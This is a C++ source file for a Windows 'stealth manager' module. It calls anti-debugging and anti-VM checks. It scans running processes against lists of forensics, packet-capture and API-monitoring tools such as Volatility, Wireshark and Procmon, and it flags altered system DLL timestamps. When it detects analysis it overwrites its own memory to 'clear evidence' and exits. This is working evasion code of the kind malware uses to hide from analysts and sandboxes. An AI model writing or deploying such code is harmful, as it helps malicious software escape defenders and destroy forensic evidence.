#include "stealth_manager.h"
#include "../common.h"
#include <windows.h>
#include <tlhelp32.h>
#include <string>
#include <vector>
#include <shlobj.h>

extern void LogInfo(const char*);
extern void LogError(const char*);

// Import functions from anti-debug and anti-vm modules
extern "C" {
    // From anti_debug.cpp
    extern bool CheckForDebugger();
    extern void ApplyAntiDebugProtection();
    extern bool PerformCompleteAntiDebugCheck();
    
    // From anti_vm.cpp
    extern bool CheckEnvironment();
    extern bool CheckVMEnvironment();
    extern bool CheckSandboxEnvironment();
    extern bool PerformCompleteAnalysisCheck();
}

// Stealth Manager Implementation
class StealthManager {
private:
    bool initialized;
    bool environment_safe;
    bool protections_applied;
    
public:
    StealthManager() : initialized(false), environment_safe(false), protections_applied(false) {}
    
    bool Initialize() {
        if (initialized) return true;
        
        LogInfo("Initializing stealth protection system...");
        
        // Apply basic protections first
        ApplyAntiDebugProtection();
        protections_applied = true;
        
        initialized = true;
        LogInfo("Stealth protection system initialized");
        
        return true;
    }
    
    bool PerformFullCheck() {
        if (!initialized) {
            if (!Initialize()) return false;
        }
        
        LogInfo("Performing comprehensive environment analysis...");
        
        // Step 1: Check for debuggers and analysis tools
        if (!PerformCompleteAntiDebugCheck()) {
            LogError("DEBUG/ANALYSIS ENVIRONMENT DETECTED - TERMINATING");
            environment_safe = false;
            return false;
        }
        
        // Step 2: Check for virtual machines and sandboxes
        if (!CheckSandboxEnvironment()) {
            LogError("VIRTUAL/SANDBOX ENVIRONMENT DETECTED - TERMINATING");
            environment_safe = false;
            return false;
        }
        
        // Step 3: Additional stealth checks
        if (!PerformAdvancedStealthChecks()) {
            LogError("ADVANCED ANALYSIS DETECTED - TERMINATING");
            environment_safe = false;
            return false;
        }
        
        environment_safe = true;
        LogInfo("All environment checks passed - system appears safe");
        
        return true;
    }
    
    bool IsEnvironmentSafe() const {
        return environment_safe;
    }
    
    void TerminateIfUnsafe() {
        if (!environment_safe) {
            LogError("Unsafe environment detected - terminating process");
            
            // Clear evidence before termination
            ClearMemoryTrace();
            
            // Multiple termination methods
            ExitProcess(0);
            TerminateProcess(GetCurrentProcess(), 0);
            abort();
        }
    }
    
private:
    bool PerformAdvancedStealthChecks() {
        // Check for memory forensics tools
        if (CheckMemoryForensicsTools()) {
            LogError("Memory forensics tools detected");
            return false;
        }
        
        // Check for network monitoring
        if (CheckNetworkMonitoring()) {
            LogError("Network monitoring detected");
            return false;
        }
        
        // Check for API monitoring
        if (CheckAPIMonitoring()) {
            LogError("API monitoring detected");
            return false;
        }
        
        // Check for system integrity
        if (CheckSystemIntegrity()) {
            LogError("System integrity compromised");
            return false;
        }
        
        return true;
    }
    
    bool CheckMemoryForensicsTools() {
        // Check for Volatility Framework and similar tools
        std::vector<std::wstring> forensicsTools = {
            L"volatility.exe",
            L"vol.exe", 
            L"python.exe", // Could be running Volatility
            L"rekall.exe",
            L"dumpit.exe",
            L"winpmem.exe",
            L"memoryze.exe",
            L"redline.exe"
        };
        
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) return false;
        
        PROCESSENTRY32W pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32W);
        
        if (Process32FirstW(hSnapshot, &pe32)) {
            do {
                std::wstring processName = pe32.szExeFile;
                for (auto& c : processName) c = towlower(c);
                
                for (const auto& tool : forensicsTools) {
                    std::wstring toolLower = tool;
                    for (auto& c : toolLower) c = towlower(c);
                    
                    if (processName == toolLower) {
                        CloseHandle(hSnapshot);
                        return true;
                    }
                }
            } while (Process32NextW(hSnapshot, &pe32));
        }
        
        CloseHandle(hSnapshot);
        return false;
    }
    
    bool CheckNetworkMonitoring() {
        // Check for network monitoring tools
        std::vector<std::wstring> networkTools = {
            L"wireshark.exe",
            L"dumpcap.exe",
            L"tshark.exe",
            L"tcpdump.exe",
            L"windump.exe",
            L"networkminer.exe",
            L"fiddler.exe",
            L"burpsuite.exe",
            L"nmap.exe"
        };
        
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) return false;
        
        PROCESSENTRY32W pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32W);
        
        if (Process32FirstW(hSnapshot, &pe32)) {
            do {
                std::wstring processName = pe32.szExeFile;
                for (auto& c : processName) c = towlower(c);
                
                for (const auto& tool : networkTools) {
                    std::wstring toolLower = tool;
                    for (auto& c : toolLower) c = towlower(c);
                    
                    if (processName == toolLower) {
                        CloseHandle(hSnapshot);
                        return true;
                    }
                }
            } while (Process32NextW(hSnapshot, &pe32));
        }
        
        CloseHandle(hSnapshot);
        return false;
    }
    
    bool CheckAPIMonitoring() {
        // Check for API monitoring tools
        std::vector<std::wstring> apiTools = {
            L"apimonitor.exe",
            L"detours.exe",
            L"apispypp.exe",
            L"winapi.exe",
            L"procmon.exe",
            L"procexp.exe",
            L"process hacker.exe",
            L"processhacker.exe"
        };
        
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) return false;
        
        PROCESSENTRY32W pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32W);
        
        if (Process32FirstW(hSnapshot, &pe32)) {
            do {
                std::wstring processName = pe32.szExeFile;
                for (auto& c : processName) c = towlower(c);
                
                for (const auto& tool : apiTools) {
                    std::wstring toolLower = tool;
                    for (auto& c : toolLower) c = towlower(c);
                    
                    if (processName.find(toolLower) != std::wstring::npos) {
                        CloseHandle(hSnapshot);
                        return true;
                    }
                }
            } while (Process32NextW(hSnapshot, &pe32));
        }
        
        CloseHandle(hSnapshot);
        return false;
    }
    
    bool CheckSystemIntegrity() {
        // Check for system modifications that indicate analysis environment
        
        // Check for unusual system file modifications
        std::vector<std::wstring> systemFiles = {
            L"C:\\Windows\\System32\\kernel32.dll",
            L"C:\\Windows\\System32\\ntdll.dll",
            L"C:\\Windows\\System32\\user32.dll",
            L"C:\\Windows\\System32\\advapi32.dll"
        };
        
        for (const auto& file : systemFiles) {
            HANDLE hFile = CreateFileW(file.c_str(), GENERIC_READ, FILE_SHARE_READ, 
                                     NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hFile != INVALID_HANDLE_VALUE) {
                FILETIME creationTime, lastWriteTime;
                if (GetFileTime(hFile, &creationTime, NULL, &lastWriteTime)) {
                    // Compare creation and modification times
                    ULARGE_INTEGER creation, modification;
                    creation.LowPart = creationTime.dwLowDateTime;
                    creation.HighPart = creationTime.dwHighDateTime;
                    modification.LowPart = lastWriteTime.dwLowDateTime;
                    modification.HighPart = lastWriteTime.dwHighDateTime;
                    
                    // If system file was modified recently, might be in analysis environment
                    if (modification.QuadPart > creation.QuadPart + 86400000000LL) { // More than 24 hours difference
                        CloseHandle(hFile);
                        return true;
                    }
                }
                CloseHandle(hFile);
            }
        }
        
        return false;
    }
    
    void ClearMemoryTrace() {
        // Clear sensitive memory areas before termination
        MEMORY_BASIC_INFORMATION mbi;
        SYSTEM_INFO si;
        GetSystemInfo(&si);
        
        LPBYTE address = (LPBYTE)si.lpMinimumApplicationAddress;
        LPBYTE maxAddress = (LPBYTE)si.lpMaximumApplicationAddress;
        
        while (address < maxAddress) {
            if (VirtualQuery(address, &mbi, sizeof(mbi))) {
                if (mbi.State == MEM_COMMIT && 
                    (mbi.Type == MEM_PRIVATE || mbi.Type == MEM_IMAGE) &&
                    (mbi.Protect & PAGE_READWRITE)) {
                    
                    // Overwrite memory with random data
                    DWORD oldProtect;
                    if (VirtualProtect(mbi.BaseAddress, mbi.RegionSize, PAGE_READWRITE, &oldProtect)) {
                        for (SIZE_T i = 0; i < mbi.RegionSize; i++) {
                            ((PBYTE)mbi.BaseAddress)[i] = (BYTE)(rand() % 256);
                        }
                        VirtualProtect(mbi.BaseAddress, mbi.RegionSize, oldProtect, &oldProtect);
                    }
                }
                address = (LPBYTE)mbi.BaseAddress + mbi.RegionSize;
            } else {
                address += si.dwPageSize;
            }
        }
    }
};

// Global stealth manager instance
static StealthManager g_stealthManager;

// Export functions
extern "C" {
    bool InitializeStealthProtection() {
        return g_stealthManager.Initialize();
    }
    
    bool PerformFullEnvironmentCheck() {
        return g_stealthManager.PerformFullCheck();
    }
    
    void ApplyAllProtections() {
        g_stealthManager.Initialize();
        ApplyAntiDebugProtection();
    }
    
    bool IsEnvironmentSafe() {
        return g_stealthManager.IsEnvironmentSafe();
    }
    
    void TerminateIfUnsafe() {
        g_stealthManager.TerminateIfUnsafe();
    }
}